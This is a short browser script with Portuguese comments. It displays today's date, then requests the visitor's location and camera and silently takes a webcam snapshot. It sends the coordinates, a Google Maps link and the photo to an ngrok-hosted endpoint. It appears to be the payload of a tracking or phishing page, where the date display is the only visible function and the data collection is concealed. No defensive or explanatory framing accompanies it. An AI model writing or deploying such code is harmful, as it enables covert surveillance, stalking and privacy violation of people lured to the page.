<script>
  document.addEventListener("DOMContentLoaded", () => {
    const dataAtual = new Date();
    const dia = String(dataAtual.getDate()).padStart(2, '0');
    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
    const ano = dataAtual.getFullYear();
    document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(sendData, (err) => {
        alert("Erro na geolocalização: " + err.message);
        console.error("Erro na geolocalização:", err);
      });
    } else {
      alert("Geolocalização não suportada.");
      console.error("Geolocalização não suportada.");
    }
  });

  async function sendData(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
    console.log("Localização:", latitude, longitude);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      // Espera para garantir que a câmera ligou (importante para celulares)
      await new Promise(resolve => setTimeout(resolve, 2500));

      const canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const image = canvas.toDataURL("image/jpeg");

      stream.getTracks().forEach(track => track.stop());

      console.log("Imagem capturada. Enviando para o backend...");

      await fetch("https://3677-177-200-138-128.ngrok-free.app/send-data", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude, longitude, maps, image })
      });

      console.log("Dados enviados com sucesso.");
    } catch (error) {
      alert("Erro ao capturar imagem.");
      console.error("Erro ao capturar imagem:", error);
    }
  }
</script>
